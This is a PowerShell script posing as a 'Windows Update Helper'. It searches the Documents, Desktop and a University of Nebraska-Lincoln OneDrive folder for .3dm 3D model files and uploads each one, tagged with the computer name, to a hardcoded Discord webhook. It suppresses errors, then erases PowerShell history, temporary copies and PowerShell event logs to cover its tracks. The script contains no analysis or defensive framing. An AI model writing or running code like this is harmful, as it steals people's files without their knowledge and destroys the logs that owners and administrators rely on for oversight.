[Console]::BackgroundColor = "Black" 
[Console]::Title = "Windows Update Helper"
Clear-Host

# Webhook configuration
$webhookUrl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"

# File extensions to search for
$fileExtensions = @("*.3dm")

# Folders to search
$foldersToSearch = @(
    "$env:USERPROFILE\Documents", 
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

# Create temporary working directory
$tempDir = "$env:TEMP\WinUpdateTemp"
if (-not (Test-Path -Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

# Function to clean up traces
function Invoke-Cleanup {
    # Clear PowerShell history
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    
    # Delete temporary files
    if (Test-Path $tempDir) {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # Clear event logs
    wevtutil cl "Windows PowerShell" | Out-Null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" | Out-Null
}

# Function to send files to Discord
function Send-ToDiscord {
    param (
        [string]$filePath
    )
    
    try {
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        
        # Create multipart form content
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $body = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream$LF",
            [System.Text.Encoding]::UTF8.GetString($fileBytes),
            "--$boundary",
            "Content-Disposition: form-data; name=`"content`"$LF",
            "New .3dm file found: $fileName from $env:COMPUTERNAME",
            "--$boundary--$LF"
        ) -join $LF

        # Send to Discord
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    }
    catch {
        # Silent error handling
    }
}

# Main collection process
try {
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
            
            foreach ($file in $files) {
                $tempFilePath = Join-Path -Path $tempDir -ChildPath $file.Name
                Copy-Item -Path $file.FullName -Destination $tempFilePath -Force -ErrorAction SilentlyContinue
                Send-ToDiscord -filePath $tempFilePath
                Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
            }
        }
    }
}
finally {
    # Clean up traces
    Invoke-Cleanup
}
